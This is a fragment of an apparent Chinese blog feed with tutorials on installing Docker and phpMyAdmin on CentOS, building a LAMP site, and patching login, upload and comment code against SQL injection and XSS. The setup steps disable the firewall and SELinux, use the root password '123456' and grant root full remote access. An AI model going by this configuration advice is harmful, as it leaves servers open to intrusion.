    <summary type="html">&lt;h6 id=&quot;通过phpMyAdmin获取靶机的控制，要满足以下三个条件：&quot;&gt;&lt;a href=&quot;#通过phpMyAdmin获取靶机的控制，要满足以下三个条件：&quot; class=&quot;headerlink&quot; title=&quot;通过phpMyAdmin获取靶机的控制，要满足以下三个条件：&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十四，CentOS安装docker并使用</title>
    <link href="http://example.com/2023/11/21/%E5%8D%81%E5%9B%9B%EF%BC%8CCentOS%E5%AE%89%E8%A3%85docker%E5%B9%B6%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/11/21/%E5%8D%81%E5%9B%9B%EF%BC%8CCentOS%E5%AE%89%E8%A3%85docker%E5%B9%B6%E4%BD%BF%E7%94%A8/</id>
    <published>2023-11-21T11:13:15.000Z</published>
    <updated>2023-11-21T12:11:36.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一，docker简介："><a href="#一，docker简介：" class="headerlink" title="一，docker简介："></a>一，docker简介：</h3><p>​Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。它可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p><p>​容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p><p>​Docker将工程及此工程依赖的所有软件打包到一个容器中统一部署，可以解决在开发环境、测试环境以及生产环境等等。多种环境去部署同一份代码，由于环境原因往往会出现软件跨环境迁移的问题！</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311211919902.png" alt="image-20231121191848479" style="zoom:50%;" /><h3 id="二，介绍Docker中的三个概念"><a href="#二，介绍Docker中的三个概念" class="headerlink" title="二，介绍Docker中的三个概念"></a>二，介绍Docker中的三个概念</h3><p>镜像image</p><p>​Docker 镜像（Image），就相当于是一个文件系统，是用于创建 Docker 容器的模板。也可以将镜像当作容器的“源代码”。镜像体积很小，非常“便携”，易于分享、存储和更新。</p><p>容器container</p><p>​容器是独立运行的一个或一组应用，是镜像运行时的实体。</p><p>注册中心(仓库)registry</p><p>​Docker 仓库用来保存镜像，有点类似于Maven的远程仓库。Registry 分为公共和私有两种。Docker 公司运营公共的 Registry 叫做 Docker Hub。用户可以在 Docker Hub 注册账号，分享并保存自己的镜像（说明：在 Docker Hub 下载镜像巨慢，可以自己构建私有的 Registry）。</p><h3 id="三，安装docker"><a href="#三，安装docker" class="headerlink" title="三，安装docker"></a>三，安装docker</h3><p>在安装docker之前，可以先做如下准备工作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1. 关闭防火墙，并禁止防火墙开机自启</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">#2. 关闭MySQL，并禁止MySQL开机自启（你的CentOS里之前安装过MySql，为防止端口冲突，需要做这一步）</span><br><span class="line">systemctl stop mysqld</span><br><span class="line">systemctl disable mysqld</span><br></pre></td></tr></table></figure><p>在联网环境下依次执行以下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 更新系统，如果需要确认，全部选 y (yes)。根据网络状况，此操作可能要花几分钟或者十几分钟时间</span><br><span class="line">yum update</span><br><span class="line"># 安装yum-utils工具和两个驱动依赖</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"># 设置使用阿里云的yum源，稍后会从阿里云下载docker软件</span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo </span><br><span class="line"># 安装docker</span><br><span class="line">yum install docker-ce</span><br><span class="line"># 查看docker版本</span><br><span class="line">docker -v</span><br></pre></td></tr></table></figure><p>设置注册中心(仓库)</p><p>如果不设置注册中心，将从默认的docker hub里下载镜像，速度非常慢。</p><p>USTC（中科大的镜像服务）是老牌的Linux镜像服务提供者（注册中心Registry），从Ubuntu5.04版本就在使用。USTC的docker镜像速度加载很快，它的优势之一是不需要注册，是真正的公共服务。</p><p>设置步骤：</p><p>创建文件夹：mkdir &#x2F;etc&#x2F;docker</p><p>编辑文件daemon.json： vi &#x2F;etc&#x2F;docker&#x2F;daemon.json</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;,&quot;https://pee6w651.mirror.aliyuncs.com&quot;],</span><br><span class="line">    &quot;live-restore&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存并退出vi：按ESC，输:wq 回车</p><p>重新加载daemon文件，然后重启docker服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="四，应用场景"><a href="#四，应用场景" class="headerlink" title="四，应用场景"></a>四，应用场景</h3><ul><li>docker镜像一旦构建，就已经一次性完成了应用自动打包、集成。docker镜像可以进行版本管理、复制、分享、修改，就像管理代码一样。</li><li>通过统一的docker环境封装（比如镜像中封装了同一版本的JDK、同样的环境变量等等），保证应用服务运行环境的一致性。避免出现在测试环境上好用，挪到生产环境下运行失败的问题。</li><li>docker可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。<br>因为镜像可下载、可复用，docker容器可快速启动等特性，结合容器编排服务(k8s)可以实现大型分布式部署的弹性伸缩，快速扩展。</li></ul><h3 id="五，Docker常用命令"><a href="#五，Docker常用命令" class="headerlink" title="五，Docker常用命令"></a>五，Docker常用命令</h3><p>1，docker的启动，停止和重启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br><span class="line">systemctl stop docker</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>2，查看docker的状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure><p>3，设置docker开机自启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><p>4查看docker的概要信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure><p>5，列出本地主机上有的镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker images [OPTIONS]</span><br><span class="line">常用参数：</span><br><span class="line">-a ：列出所有的镜像 （含历史映像层）</span><br><span class="line">-q ：只显示镜像ID</span><br><span class="line">example：</span><br><span class="line">docker images -a</span><br><span class="line">docker images -q</span><br><span class="line">docker images -aq</span><br><span class="line">docker images redis   #查找镜像名为redis的镜像</span><br><span class="line">docker images redis:6.0.8   #查找镜像名:版本号(REPOSITORY：TAG)对应的镜像</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311211935011.png" alt="image-20231121193502304"></p><p>字段解析：</p><ul><li>REPOSITORY：表示镜像的仓库源</li><li>TAG：镜像的标签版本号</li><li>IMAGE ID：镜像ID</li><li>CREATED：镜像创建时间</li><li>SIZE：镜像大小</li></ul><p>6，从远程库拉取镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名字[:TAG]</span><br><span class="line">example：</span><br><span class="line">docker pull redis:6.0.8</span><br><span class="line">docker pull ubuntu  # 没有指定版本即拉取最新版 即默认为 ubuntu:latest</span><br></pre></td></tr></table></figure><p>7，删除本地有的镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#删除单个</span><br><span class="line">docker rmi 镜像ID  #删除镜像，如果此时镜像上面有容器正在运行，会报错无法删除</span><br><span class="line">docker rmi  -f 镜像ID   #强制(forced)删除镜像</span><br><span class="line">#删除多个</span><br><span class="line">docker rmi -f 镜像名1:TAG 镜像名2:TAG </span><br><span class="line">#删除全部（慎用）</span><br><span class="line">docker rmi -f $(docker images -qa)  </span><br><span class="line">#首先docker images -qa会列举本地所有的镜像的ID，然后作为一个集合送入rmi一个个删除</span><br></pre></td></tr></table></figure><p>8，新建启动容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">常用参数：</span><br><span class="line">--name=NAME   #为容器指定名字为NAME，不使用的话系统自动为容器命名</span><br><span class="line">-d: 后台运行容器并返回容器ID，也即启动守护式容器(后台运行)；</span><br><span class="line">-i：以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line">-t：为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">也即启动交互式容器(前台有伪终端，等待交互，一般连用，即-it)；</span><br><span class="line">-P: 随机端口映射，大写P</span><br><span class="line">-p: 指定端口映射，小写p </span><br><span class="line">example：</span><br><span class="line">以ubuntu为例，启动后要交互先声明交互模式，其次交互得需要一个终端，因此参数为-it</span><br><span class="line">docker run -it ubuntu /bin/bash</span><br><span class="line">指定名称</span><br><span class="line">docker run -it --name=myubuntu ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>9，启动守护式容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -d 容器名</span><br><span class="line"> </span><br><span class="line">example：</span><br><span class="line">docker run -d redis:6.0.8</span><br><span class="line">docker run -d ubuntu</span><br></pre></td></tr></table></figure><p>10，列出正在运行的容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker ps [OPTIONS]</span><br><span class="line">常用参数：</span><br><span class="line">-a :列出当前所有正在运行的容器+历史上运行过的</span><br><span class="line">-l :显示最近创建的容器。</span><br><span class="line">-n nu：显示最近nu个创建的容器。</span><br><span class="line">-q :静默模式，只显示容器编号。</span><br><span class="line">example：</span><br><span class="line">docker ps -aq</span><br><span class="line">docker ps -n 3</span><br><span class="line">docker ps -l</span><br></pre></td></tr></table></figure><p>11，进入正在运行的容器并以命令行交互</p><p>（1）docker exec -it 容器ID&#x2F;容器名称 bashShell</p><p>（2）docker attach 容器ID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">example：</span><br><span class="line">#容器ID</span><br><span class="line">docker exec -it c32f612cc218 /bin/bash</span><br><span class="line">docker attach c32f612cc218</span><br><span class="line">#容器名称</span><br><span class="line">docker exec -it wizardly_booth /bin/bash</span><br><span class="line">docker attach wizardly_booth</span><br></pre></td></tr></table></figure><p>区别 ：</p><p>​exec 是在容器中打开新的终端，并且可以启动新的进程。用exit退出，不会导致容器的停止，attach 直接进入容器启动命令的终端，不会启动新的进程。用exit退出，会导致容器的停止。推荐大家使用 docker exec 命令，因为退出容器终端，不会导致容器的停止。</p><p>12，启动，重启和停止容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器ID或者容器名</span><br><span class="line">docker restart 容器ID或者容器名</span><br><span class="line">docker stop 容器ID或者容器名</span><br><span class="line">docker kill 容器ID或容器名  # 强制停止容器</span><br></pre></td></tr></table></figure><p>13，删除已停止的容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#删除一个</span><br><span class="line">docker rm 容器ID  </span><br><span class="line">docker rm -f 容器ID  #强制删除</span><br><span class="line">#删除多个</span><br><span class="line">docker rm -f $(docker ps -a -q)</span><br><span class="line">或</span><br><span class="line">docker ps -a -q | xargs docker rm</span><br></pre></td></tr></table></figure><h3 id="六，安装并启动phpmyadmin"><a href="#六，安装并启动phpmyadmin" class="headerlink" title="六，安装并启动phpmyadmin"></a>六，安装并启动phpmyadmin</h3><p>安装phpmyadmin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull phpmyadmin/phpmyadmin</span><br></pre></td></tr></table></figure><p>启动MySQL和phpmyadmin服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> docker inspect mysql57</span><br><span class="line">docker run --name mysql57 -v mysql57:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -p 3306:3306 -d mysql:5.7</span><br><span class="line"></span><br><span class="line">docker exec -it mysql57 bash</span><br><span class="line">docker run --name phpmyadmin --link mysql57:db -p 9998:80 -d phpmyadmin/phpmyadmin</span><br></pre></td></tr></table></figure><p>打开网址：192.168.0.44：9998进入phpmyadmin管理网站</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311212011788.png" alt="image-20231121201110643" style="zoom:67%;" /><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一，docker简介：&quot;&gt;&lt;a href=&quot;#一，docker简介：&quot; class=&quot;headerlink&quot; title=&quot;一，docker简介：&quot;&gt;&lt;/a&gt;一，docker简介：&lt;/h3&gt;&lt;p&gt;​		Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十三，CentOS搭建网站</title>
    <link href="http://example.com/2023/11/20/%E5%8D%81%E4%B8%89%EF%BC%8CCentOS%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/"/>
    <id>http://example.com/2023/11/20/%E5%8D%81%E4%B8%89%EF%BC%8CCentOS%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/</id>
    <published>2023-11-20T12:30:19.000Z</published>
    <updated>2023-11-20T12:34:04.000Z</updated>
    
    <content type="html"><![CDATA[<hr><h3 id="一、下载CentOS"><a href="#一、下载CentOS" class="headerlink" title="一、下载CentOS"></a>一、下载CentOS</h3><p>清华大学开源软件镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/%EF%BC%8C%E4%B8%8B%E8%BD%BDCentOS-vault">https://mirrors.tuna.tsinghua.edu.cn/，下载CentOS-vault</a> 7.9.2版本–&gt;isos–&gt;x86_64</p><p><img src="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120194808047.png" alt="image-20231120194808047"></p><h3 id="二、安装CentOS"><a href="#二、安装CentOS" class="headerlink" title="二、安装CentOS"></a>二、安装CentOS</h3><p>打开虚拟机，新建虚拟机，典型安装，设置安装路径，一直点击下一步，设置语言，网络配置开启，安装地址选择</p><p>然后设置root密码，等待加载</p><h3 id="三、配置CentOS"><a href="#三、配置CentOS" class="headerlink" title="三、配置CentOS"></a>三、配置CentOS</h3><p>1.<code>rm -f /var/run/yum.pid</code>     清理睡眠状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">rm -f /var/run/yum.pid</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=3306/tcp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=3306/udp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=80/tcp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=80/udp</span><br><span class="line">firewall-cmd --reload   #复制这几行代码到CentOS</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">yum remove mariadb-libs.x86_64</span><br><span class="line">yum install httpd -y</span><br><span class="line">systemctl enable httpd</span><br><span class="line">systemctl restart httpd</span><br><span class="line">systemctl status httpd</span><br><span class="line">yum -y install mariadb mariadb-server</span><br><span class="line">systemctl enable mariadb</span><br><span class="line">systemctl start mariadb</span><br><span class="line">mysql_secure_installation</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.开放防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=public --add-port=3306/tcp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=3306/udp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=80/tcp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=80/udp</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>3.关闭selinux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/selinux/config</span><br><span class="line">将SELINUX=enforcing这一行修改为SELINUX=disabled</span><br></pre></td></tr></table></figure><p>4.reboot</p><p>5.删除默认数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep mariadb 查找出默认数据库mariadb的包名。</span><br><span class="line">yum remove mariadb-libs.x86_64    删除</span><br></pre></td></tr></table></figure><ol start="6"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd -y</span><br><span class="line">systemctl enable httpd</span><br><span class="line">systemctl restart httpd</span><br><span class="line">systemctl status httpd           //查看服务状态</span><br><span class="line">此时访问成功回显apache测试页，网站根目录/var/www/html</span><br></pre></td></tr></table></figure><p>7.安装mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum -y install mariadb mariadb-server</span><br><span class="line">systemctl enable mariadb</span><br><span class="line">systemctl start mariadb</span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure><p>8.进行MySQL设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Enter current password for root (enter for none):&lt;–初次运行直接回车Set root password? [Y/n]&lt;– 是否设置root用户密码，输入y并回车或直接回车</span><br><span class="line">New password:&lt;– 设置root用户的密码</span><br><span class="line">Re-enter new password:&lt;– 再输入一次你设置的密码</span><br><span class="line">其他配置</span><br><span class="line">Remove anonymous users? [Y/n]&lt;– 是否删除匿名用户，回车</span><br><span class="line">Disallow root login remotely? [Y/n]&lt;–是否禁止root远程登录,回车,</span><br><span class="line">Remove test database and access to it? [Y/n]&lt;– 是否删除test数据库，回车</span><br><span class="line">Reload privilege tables now? [Y/n]&lt;– 是否重新加载权限表，回车</span><br><span class="line"></span><br><span class="line">初始化MariaDB完成，接下来测试登录</span><br><span class="line">mysql -uroot -p你的密码</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;你的密码的明文&#x27; WITH GRANT OPTION;      </span><br><span class="line">FLUSH PRIVILEGES;                  远程登陆</span><br><span class="line">完成。</span><br></pre></td></tr></table></figure><p>9.php安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  a. rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm </span><br><span class="line">  b. yum -y remove php*</span><br><span class="line">  c. yum -y install php72w php72w-cli php72w-fpm php72w-common php72w-devel php72w-embedded php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml</span><br><span class="line">  d. systemctl enable php-fpm.service </span><br><span class="line">systemctl start php-fpm.service</span><br></pre></td></tr></table></figure><ol start="10"><li>配置Apache解析php文件并自动关联</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.  a. vi /etc/httpd/conf/httpd.conf</span><br><span class="line">      b. 找到：DirectoryIndex index.html改为：DirectoryIndex index.html index.htm index.php</span><br><span class="line">      c. 找到：AddType application/x-gzip .gz .tgz在该行下面添加：AddType application/x-httpd-php .php</span><br><span class="line">      d. 重启Apache：systemctl restart httpd</span><br><span class="line">      e. 在浏览器输入服务器IP地址或者绑定的域名访问即可，html文件下是网站主目录，如果是里面有个文件夹才是主目录可以在配置文件修改主目录路径，或者在IP地址访问后面加上文件夹名字。</span><br></pre></td></tr></table></figure><h3 id="四、移动php文件"><a href="#四、移动php文件" class="headerlink" title="四、移动php文件"></a>四、移动php文件</h3><p>1.找到WWW文件夹，解压，然后就在这个目录下打开cmd输入<code>scp -r .\WWW.zip root@CentOSip地址:\var\www\html\</code>，输入root密码</p><p><img src="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120200010024.png" alt="image-20231120200010024"></p><p>2.在CentOS中把刚才的WWW.zip解压到当前文件夹&#x2F;html</p><p><img src="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120200914950.png" alt="image-20231120200914950"></p><p>3.打开Navicat，创建新的MySql连接</p><img src="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120200841896.png" alt="image-20231120200841896" style="zoom:67%;" /><p>用户名：root  密码为之前为MariaDB的密码，连接成功后把你需要的数据库复制到这里就可以。</p><p>数据库连接成功后就可以打开你的网站了。</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h3 id=&quot;一、下载CentOS&quot;&gt;&lt;a href=&quot;#一、下载CentOS&quot; class=&quot;headerlink&quot; title=&quot;一、下载CentOS&quot;&gt;&lt;/a&gt;一、下载CentOS&lt;/h3&gt;&lt;p&gt;清华大学开源软件镜像：&lt;a href=&quot;https://mirro</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十二，网站问题修复</title>
    <link href="http://example.com/2023/11/15/%E5%8D%81%E4%BA%8C%EF%BC%8C%E7%BD%91%E7%AB%99%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D/"/>
    <id>http://example.com/2023/11/15/%E5%8D%81%E4%BA%8C%EF%BC%8C%E7%BD%91%E7%AB%99%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D/</id>
    <published>2023-11-15T07:54:32.000Z</published>
    <updated>2023-11-15T08:10:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>​在之前的网站搭建中，网站还有一些问题会影响网站的使用，例如SQL注入和XSS攻击等，这篇文章讲述对这些问题的修复方案</p><p>1，之前的主页退出后再点击浏览器的回退见还可以返回主页面，原因是没有清除会话数据，解决代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;h1&gt;&lt;a href=&quot;?logout=true&quot;&gt;注销&lt;/a&gt;&lt;/h1&gt;&#x27;;</span><br><span class="line">if (isset($_GET[&#x27;logout&#x27;])) &#123;</span><br><span class="line">    // 清除会话数据</span><br><span class="line">    session_unset();</span><br><span class="line">    session_destroy();</span><br><span class="line">    echo &quot;您已成功注销。&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2，在文件上传之后，很容易发现文件名和文件所处的位置，这样就很容易被植入木马，所以要对文件名称和位置进行加密处理，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 生成随机的文件名</span><br><span class="line">    $random_name = time().uniqid() . &#x27;_&#x27; . $file_name;</span><br><span class="line">    // 移动文件到目标位置</span><br><span class="line">    $target_path = $upload_dir .&quot;\\&quot;. md5($random_name).$file_name;</span><br></pre></td></tr></table></figure><p>3，在登录功能中简单的使用拼接的方式拼接变量很容易引发SQL注入的问题，可以用预编译语句来处理SQL语句再执行，但是一些场景不适用预编译，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 使用预编译语句</span><br><span class="line">    $sql = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;;</span><br><span class="line">    $stmt = mysqli_prepare($link, $sql);</span><br><span class="line">    // 绑定参数</span><br><span class="line">    mysqli_stmt_bind_param($stmt, &quot;ss&quot;, $u, $p);</span><br><span class="line">    // 执行查询</span><br><span class="line">    mysqli_stmt_execute($stmt);</span><br><span class="line">    // 获取结果集</span><br><span class="line">    $result = mysqli_stmt_get_result($stmt);</span><br></pre></td></tr></table></figure><p>4，在评论功能中也很容易发生SQL注入和XSS攻击，可以对获取的评论内容进行加密和转义来预防这些问题，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 处理评论</span><br><span class="line">$comment = htmlspecialchars($_POST[&#x27;comment&#x27;]); // 防止 XSS 攻击</span><br><span class="line">$comment = mysqli_real_escape_string($link, $comment); // 转义评论，防止 SQL 注入</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		在之前的网站搭建中，网站还有一些问题会影响网站的使用，例如SQL注入和XSS攻击等，这篇文章讲述对这些问题的修复方案&lt;/p&gt;
&lt;p&gt;1，之前的主页退出后再点击浏览器的回退见还可以返回主页面，原因是没有清除会话数据，解决代码如下：&lt;/p&gt;
&lt;figure class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十一，php搭建管理员页面</title>
    <link href="http://example.com/2023/11/15/%E5%8D%81%E4%B8%80%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2/"/>
    <id>http://example.com/2023/11/15/%E5%8D%81%E4%B8%80%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2/</id>
    <published>2023-11-15T07:30:36.000Z</published>
    <updated>2023-11-15T07:48:32.000Z</updated>
    
